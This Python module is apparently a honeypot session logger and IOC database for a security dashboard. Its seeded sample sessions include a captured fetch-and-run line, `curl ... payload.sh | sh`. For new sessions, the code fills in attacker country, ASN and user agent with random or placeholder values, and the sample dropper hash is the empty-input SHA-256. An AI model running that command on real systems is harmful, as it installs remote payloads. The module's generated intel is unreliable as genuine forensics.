"""
Layer 2 Honeypot Forensic Capture & IOC Extraction Engine.
Maintains persistent quarantined attacker sessions, command logs, and IOC database.
Stored on disk in app/data/honeypot_vault.json.
"""
import os
import json
from datetime import datetime, timedelta
import random

DATA_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'data')
os.makedirs(DATA_DIR, exist_ok=True)
VAULT_PATH = os.path.join(DATA_DIR, 'honeypot_vault.json')

DEFAULT_SESSIONS = [
    {
        "session_id": "HP-SESS-9041",
        "attacker_ip": "203.0.113.42",
        "target_port": 80,
        "protocol": "TCP/HTTP",
        "attack_type": "DDOS_SYN_FLOOD",
        "mitre_ttp": "T1498.001 - Network DoS",
        "start_time": (datetime.utcnow() - timedelta(minutes=14)).strftime("%H:%M:%S"),
        "duration": "00:04:12",
        "status": "QUARANTINED",
        "captured_commands": [
            "GET /wp-login.php HTTP/1.1 (Host: 10.0.0.1)",
            "GET /xmlrpc.php HTTP/1.1 [Flooding 250 req/sec]",
            "POST /admin/ajax.php [Rapid Burst TCP ACK/SYN]"
        ],
        "threat_intel": {
            "asn": "AS13335 Cloud Network",
            "country": "NL",
            "user_agent": "Mozilla/5.0 (compatible; Mirai/2.0)"
        }
    },
    {
        "session_id": "HP-SESS-8922",
        "attacker_ip": "198.51.100.18",
        "target_port": 22,
        "protocol": "TCP/SSH",
        "attack_type": "BRUTE_FORCE",
        "mitre_ttp": "T1110.001 - Password Guessing",
        "start_time": (datetime.utcnow() - timedelta(minutes=28)).strftime("%H:%M:%S"),
        "duration": "00:08:45",
        "status": "QUARANTINED",
        "captured_commands": [
            "SSH-2.0-OpenSSH_8.2p1 authentication attempts: 184 tries",
            "Attempted usernames: root, admin, ubuntu, deploy, test",
            "Decoy shell granted -> Attacker executed: `whoami`",
            "Decoy shell -> Attacker executed: `uname -a; cat /proc/cpuinfo`",
            "Decoy shell -> Attacker executed: `curl -s http://91.240.118.2/payload.sh | sh` [BLOCKED & HASHED]"
        ],
        "threat_intel": {
            "asn": "AS49505 Host Provider",
            "country": "RU",
            "user_agent": "SSH-2.0-libssh-0.9.4"
        }
    },
    {
        "session_id": "HP-SESS-8710",
        "attacker_ip": "45.143.201.12",
        "target_port": 8080,
        "protocol": "TCP/HTTP",
        "attack_type": "RECON_PORT_SCAN",
        "mitre_ttp": "T1046 - Network Service Scanning",
        "start_time": (datetime.utcnow() - timedelta(minutes=42)).strftime("%H:%M:%S"),
        "duration": "00:02:18",
        "status": "TERMINATED",
        "captured_commands": [
            "Nmap SYN scan sweeping ports 20-10000",
            "Probe sent to /actuator/gateway/routes [Spring RCE Probe]",
            "Probe sent to /solr/admin/info/system [Log4j/Solr Probe]"
        ],
        "threat_intel": {
            "asn": "AS200019 Digital Server",
            "country": "DE",
            "user_agent": "Mozilla/5.0 (Nmap Scripting Engine)"
        }
    }
]

DEFAULT_IOCS = [
    {
        "ioc_id": "IOC-001",
        "indicator": "203.0.113.42",
        "type": "IPv4",
        "port": 80,
        "threat": "DDOS_SYN_FLOOD",
        "severity": "CRITICAL",
        "confidence": 98,
        "occurrences": 342,
        "first_seen": "18:24:00",
        "last_seen": "Just now",
        "mitre": "T1498.001"
    },
    {
        "ioc_id": "IOC-002",
        "indicator": "198.51.100.18",
        "type": "IPv4",
        "port": 22,
        "threat": "SSH_BRUTE_FORCE",
        "severity": "HIGH",
        "confidence": 94,
        "occurrences": 184,
        "first_seen": "17:40:12",
        "last_seen": "10m ago",
        "mitre": "T1110"
    },
    {
        "ioc_id": "IOC-003",
        "indicator": "45.143.201.12",
        "type": "IPv4",
        "port": 8080,
        "threat": "RECON_PORT_SCAN",
        "severity": "MEDIUM",
        "confidence": 88,
        "occurrences": 56,
        "first_seen": "16:15:33",
        "last_seen": "25m ago",
        "mitre": "T1046"
    },
    {
        "ioc_id": "IOC-004",
        "indicator": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "type": "SHA-256",
        "port": 22,
        "threat": "MALICIOUS_DROPPER",
        "severity": "CRITICAL",
        "confidence": 100,
        "occurrences": 1,
        "first_seen": "17:48:00",
        "last_seen": "10m ago",
        "mitre": "T1059.004"
    }
]

def load_vault():
    """Load persistent honeypot sessions and IOCs from disk."""
    if os.path.exists(VAULT_PATH):
        try:
            with open(VAULT_PATH, 'r') as f:
                data = json.load(f)
                return data.get('sessions', DEFAULT_SESSIONS), data.get('iocs', DEFAULT_IOCS)
        except Exception as e:
            print(f"Error loading honeypot vault: {e}")
    return list(DEFAULT_SESSIONS), list(DEFAULT_IOCS)

def save_vault(sessions, iocs):
    """Save honeypot sessions and IOCs to disk."""
    try:
        with open(VAULT_PATH, 'w') as f:
            json.dump({
                'last_updated': datetime.utcnow().isoformat(),
                'sessions_count': len(sessions),
                'iocs_count': len(iocs),
                'sessions': sessions,
                'iocs': iocs
            }, f, indent=2)
    except Exception as e:
        print(f"Error saving honeypot vault: {e}")

# Initialize persistent lists
HONEYPOT_SESSIONS, IOC_DATABASE = load_vault()

def record_honeypot_quarantine(flow_data):
    """
    Called when a flow is quarantined by the Policy Engine.
    Creates a new Honeypot session or increments existing attacker session.
    Persists to disk immediately.
    """
    global HONEYPOT_SESSIONS, IOC_DATABASE
    src_ip = flow_data.get('src_ip', 'Unknown')
    attack_type = flow_data.get('attack_category', 'UNKNOWN_ATTACK')
    target_port = flow_data.get('port', 80)
    
    # Check if session already exists for this IP
    for session in HONEYPOT_SESSIONS:
        if session['attacker_ip'] == src_ip and session['status'] == 'QUARANTINED':
            session['captured_commands'].append(
                f"Packet burst intercepted at {datetime.utcnow().strftime('%H:%M:%S')} - Detained in sandbox"
            )
            save_vault(HONEYPOT_SESSIONS, IOC_DATABASE)
            return session
            
    # Create new session
    session_id = f"HP-SESS-{random.randint(1000, 9999)}"
    commands_map = {
        "DDOS_SYN_FLOOD": [
            f"SYN Packet burst detected ({flow_data.get('packet_count', 16)} pkts)",
            "Honeypot Decoy TCP ACK handshakes returned to stall attacker",
            "Attacker bandwidth absorbed into sinkhole sandbox"
        ],
        "BRUTE_FORCE": [
            "Decoy SSH server accepted connection",
            "Simulated login prompt -> Intercepted credential attempts",
            "Command sandbox logging interactive keystrokes"
        ],
        "RECON_PORT_SCAN": [
            "Decoy virtual ports 21, 22, 80, 443, 8080 responding as open",
            "Banner grabbing signatures trapped and fingerprinted"
        ],
        "DOS_SLOWLORIS": [
            "Holding open 12 decoy HTTP keep-alive connections",
            "Zero impact on production web tier"
        ]
    }
    
    commands = commands_map.get(attack_type, [
        f"Anomalous flow quarantined at {datetime.utcnow().strftime('%H:%M:%S')}",
        "Payload diverted from production network into isolated sandbox"
    ])
    
    new_session = {
        "session_id": session_id,
        "attacker_ip": src_ip,
        "target_port": target_port,
        "protocol": f"TCP/{target_port}",
        "attack_type": attack_type,
        "mitre_ttp": flow_data.get('mitre_ttp', 'T1498'),
        "start_time": datetime.utcnow().strftime("%H:%M:%S"),
        "duration": "00:01:15",
        "status": "QUARANTINED",
        "captured_commands": commands,
        "threat_intel": {
            "asn": f"AS{random.randint(10000, 50000)} Autonomous System",
            "country": random.choice(["RO", "CN", "RU", "US", "BR"]),
            "user_agent": "Automated Attack Script v1.4"
        }
    }
    
    HONEYPOT_SESSIONS.insert(0, new_session)
    if len(HONEYPOT_SESSIONS) > 25:
        HONEYPOT_SESSIONS.pop()
        
    # Update IOCs
    existing_ioc = next((i for i in IOC_DATABASE if i['indicator'] == src_ip), None)
    if existing_ioc:
        existing_ioc['occurrences'] += 1
        existing_ioc['last_seen'] = "Just now"
    else:
        IOC_DATABASE.insert(0, {
            "ioc_id": f"IOC-{len(IOC_DATABASE)+1:03d}",
            "indicator": src_ip,
            "type": "IPv4",
            "port": target_port,
            "threat": attack_type,
            "severity": "CRITICAL" if flow_data.get('risk_score', 0) > 85 else "HIGH",
            "confidence": int(flow_data.get('risk_score', 90)),
            "occurrences": 1,
            "first_seen": datetime.utcnow().strftime("%H:%M:%S"),
            "last_seen": "Just now",
            "mitre": flow_data.get('mitre_ttp', '').split(' - ')[0]
        })
        
    save_vault(HONEYPOT_SESSIONS, IOC_DATABASE)
    return new_session

def get_all_sessions():
    return HONEYPOT_SESSIONS

def get_all_iocs():
    return IOC_DATABASE
